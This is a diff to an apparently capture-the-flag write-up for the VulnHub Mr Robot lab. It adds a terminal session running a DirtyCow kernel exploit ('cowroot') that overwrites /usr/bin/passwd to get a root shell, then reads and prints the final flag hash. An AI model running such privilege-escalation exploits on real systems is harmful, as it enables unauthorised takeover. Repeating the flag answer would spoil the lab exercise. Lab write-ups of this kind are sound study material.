@@ -3814,12 +3814,46 @@ root@linux:/tmp#
 <p></p>
 We have successfully escalated our priveledges! now we can change to the root directory and look at the root flag!
 <p></p>
+Now I had to attempt this whole process a couple of times because of the instability of dirtycow. It just kept crashing the system! But after 3 attempts it worked!
+<p></p>
 
 ```
-
+robot@linux:/tmp$ ./cowroot
+./cowroot
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 47032
+Racing, this may take a while..
+/usr/bin/passwd is overwritten
+Popping root shell.
+Don't forget to restore /tmp/bak
+thread stopped
+thread stopped
+root@linux:/tmp# cd /root
+cd /root
+root@linux:/root# ls
+ls
+firstboot_done  key-3-of-3.txt
+root@linux:/root# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
 ```
 
 <p></p>
+And you can see we got thhe final key!!!
+<p></p>
+key 3-of-3.txt = 04787ddef27c3dee1ee161b21670b4e4
+<p></p>
+A screen grab for reference.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/9669dc6005c0762eeeb6d9aa8e54305d49d6d142/Starting_Point/VulnHub/MrRobot/images/peas.png"><br>
+</div>
+<p></p>
+
+
+
+
 
 <a href="https://book.hacktricks.xyz/" rel="nofollow">HackTricks</a>
 
